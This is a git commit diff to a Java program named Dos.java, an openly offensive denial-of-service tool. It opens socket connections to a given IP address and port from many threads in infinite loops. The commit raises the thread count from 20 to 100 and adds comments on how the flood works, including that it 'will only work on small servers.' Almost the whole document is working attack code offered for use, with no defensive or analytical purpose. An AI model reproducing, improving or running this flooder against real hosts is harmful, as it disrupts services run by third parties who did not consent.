836c8aa9f35d68635e34e3750356fc9545272b07
Suraj Sharma <surajsharma571994@gmail.com>
2017-12-18 05:48:32 +0530

    Update Dos.java

--- Dos.java
+++ Dos.java
@@ -1,4 +1,6 @@
 //usage : Dos <IPAddress> <Port>
+//sockets works as payload and network traffic is increased.
+//will only work on small servers.
 import java.io.*;
 import java.net.*;
 class Dos{
@@ -8,14 +10,14 @@ class Dos{
             return;
         }
 		try{
-			if(new Socket(arg[0],Integer.parseInt(arg[1]))!=null){
+			if(new Socket(arg[0],Integer.parseInt(arg[1]))!=null){//creates a new socket connection.
 				System.out.println("Attacking...");
-				for(int i=0;i<20;i++){
-					new Thread(){
+				for(int i=0;i<100;i++){
+					new Thread(){//creates a new thread on every loop
 						public void run(){
 							for(;;){
 								try{
-									new Socket(arg[0],Integer.parseInt(arg[1])); 
+									new Socket(arg[0],Integer.parseInt(arg[1])); //creates a new socket on every loop
 								}catch(Exception e){System.out.println(e);}
 							}
 						}
